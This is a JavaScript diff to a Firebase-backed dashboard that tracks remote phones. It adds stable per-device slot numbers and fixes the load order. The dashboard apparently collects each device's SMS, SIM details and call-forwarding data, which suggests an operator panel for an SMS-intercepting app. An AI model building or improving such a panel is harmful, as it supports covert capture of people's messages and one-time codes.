@@ -832,6 +832,11 @@ var SYNC_WARN_CACHE = {}; /* devKey -> {warn: true/false} */
 var TTIMER=null, SCROLL_POS=0, STIMER=null, ATIMER=null;
 var PREV_KEYS={}, infoES=null, CURTAB='online';
 var STARS={}; /* deviceKey -> true, loaded from Firebase (All_User/Stars), independent of device-written Info data */
+var SLOTS={}; /* deviceKey -> permanent display number, loaded from Firebase (All_User/DeviceSlots).
+  Fixes the list jumping around: the device's own app rewrites its Info node on every
+  check-in, and that JSON key order is not guaranteed stable between fetches, which is
+  why the old numbering (just the array position) kept changing. This number, once
+  assigned, is stored in Firebase and never changes again for that device. */
 
 /* ===== REST API ===== */
 function mkUrl(path, extra) {
@@ -1252,10 +1257,19 @@ function launchApp(infoData) {
   document.getElementById('setup-screen').style.display = 'none';
   var a = document.getElementById('app');
   a.style.display = 'flex'; a.style.flexDirection = 'column';
-  procInfo(infoData);
-  startInfoSSE();
   loadAdminPass();
-  loadStars();
+  /* Load the permanent slot numbers (and stars) BEFORE the very first procInfo
+     run. Otherwise, on every fresh page load, SLOTS would still be empty at
+     that moment, every device would look brand-new, and procInfo would hand
+     out and PERMANENTLY SAVE a fresh set of wrong numbers before the real
+     ones from Firebase even arrived - silently corrupting the numbering. */
+  Promise.all([
+    fbGet('DeviceSlots').then(function(d) { SLOTS = (d && typeof d === 'object') ? d : {}; }).catch(function() {}),
+    fbGet('Stars').then(function(d) { STARS = (d && typeof d === 'object') ? d : {}; }).catch(function() {})
+  ]).then(function() {
+    procInfo(infoData);
+    startInfoSSE();
+  });
 }
 
 function loadStars() {
@@ -1264,6 +1278,22 @@ function loadStars() {
     Object.keys(DEVS).forEach(function(k) { DEVS[k].star = !!STARS[k]; });
     renderDevLists();
   }).catch(function() {});
+}
+
+function loadSlots() {
+  fbGet('DeviceSlots').then(function(d) {
+    SLOTS = (d && typeof d === 'object') ? d : {};
+    Object.keys(DEVS).forEach(function(k) { DEVS[k].slot = SLOTS[k] || null; });
+    renderDevLists();
+  }).catch(function() {});
+}
+
+/* Highest slot number handed out so far, so a brand-new device gets max+1 -
+   assigned once, in Firebase, and never touched again after that. */
+function nextSlotNum() {
+  var max = 0;
+  Object.keys(SLOTS).forEach(function(k) { if (SLOTS[k] > max) max = SLOTS[k]; });
+  return max + 1;
 }
 
 function toggleStar(key, ev, btnEl) {
@@ -1290,7 +1320,7 @@ function doLogout() {
   document.getElementById('setup-screen').style.display = 'flex';
   var btn = document.getElementById('setup-btn');
   btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
-  DEVS = {}; CUR = null; PREV_KEYS = {}; STARS = {};
+  DEVS = {}; CUR = null; PREV_KEYS = {}; STARS = {}; SLOTS = {};
   SYNC_WARN_CACHE = {};
   DATA_TAB_CACHE = {}; FWD_TAB_CACHE = {}; NOTE_CACHE = {};
   /* If this session was opened via a pre-configured link, show password screen again
@@ -1414,6 +1444,13 @@ function procInfo(data) {
     total++;
     /* did field = key used in Sms, Data, SimINFO, Call_For nodes */
     var did = info.did || info.Did || k;
+    if (SLOTS[k] === undefined) {
+      /* Brand-new device seen for the first time - hand it the next free number
+         and save it to Firebase immediately so it's permanent from now on. */
+      var newSlot = nextSlotNum();
+      SLOTS[k] = newSlot;
+      fbSet('DeviceSlots/' + k, newSlot).catch(function() {});
+    }
     newDevs[k] = {
       key: k,
       did: did,
@@ -1423,7 +1460,8 @@ function procInfo(data) {
       on: isOn,
       sms: (DEVS[k] && DEVS[k].sms) ? DEVS[k].sms : [],
       sim: (DEVS[k] && DEVS[k].sim) ? DEVS[k].sim : {},
-      star: !!STARS[k]
+      star: !!STARS[k],
+      slot: SLOTS[k]
     };
   }
   DEVS = newDevs;
@@ -1475,12 +1513,17 @@ function switchDTab(tab) {
 }
 
 /* ===== DEVICE LISTS ===== */
+function bySlot(a, b) { return (a.slot || 0) - (b.slot || 0); }
+
 function renderDevLists() {
   var devs = Object.values(DEVS), online = [], offline = [], starred = [];
   for (var i = 0; i < devs.length; i++) {
     if (devs[i].on) online.push(devs[i]); else offline.push(devs[i]);
     if (devs[i].star) starred.push(devs[i]);
   }
+  /* Sort by the permanent slot number, NOT array/object order, so a device's
+     position in the list stays put instead of jumping around every refresh. */
+  online.sort(bySlot); offline.sort(bySlot); starred.sort(bySlot);
   renderDevPanel('pnl-online', online, 0);
   renderDevPanel('pnl-offline', offline, online.length);
   renderDevPanel('pnl-star', starred, 0);
@@ -1513,7 +1556,7 @@ function renderDevPanel(pid, devs, si) {
       ? '<span class="st-pill st-on"><span class="st-dot"></span>Online</span><span id="syncwarn-' + d.key + '" style="font-size:10px;"></span>'
       : '<span class="st-pill st-off"><span class="st-dot"></span>Offline</span><span class="st-last" id="lst-' + d.key + '">Last SMS: -</span>';
     inner.innerHTML =
-      '<div class="dev-num">' + (si + i + 1) + '</div>' +
+      '<div class="dev-num">#' + (d.slot || (si + i + 1)) + '</div>' +
       '<div class="dev-avatar">&#128241;</div>' +
       '<div class="dev-info">' +
         '<div class="dev-name">' + eh(d.name) + '</div>' +
@@ -1762,7 +1805,9 @@ function delDev(key, btn) {
   btn.textContent = '...'; btn.disabled = true;
   fbDel('Info/' + key)
     .then(function() {
-      delete DEVS[key]; delete STARS[key]; fbDel('Stars/' + key).catch(function(){});
+      delete DEVS[key]; delete STARS[key]; delete SLOTS[key];
+      fbDel('Stars/' + key).catch(function(){});
+      fbDel('DeviceSlots/' + key).catch(function(){});
       updSmsCnt(); renderDevLists(); showToast('Device deleted!');
     })
     .catch(function(e) { btn.textContent = 'Delete'; btn.disabled = false; showToast('Fail: ' + e.message); });
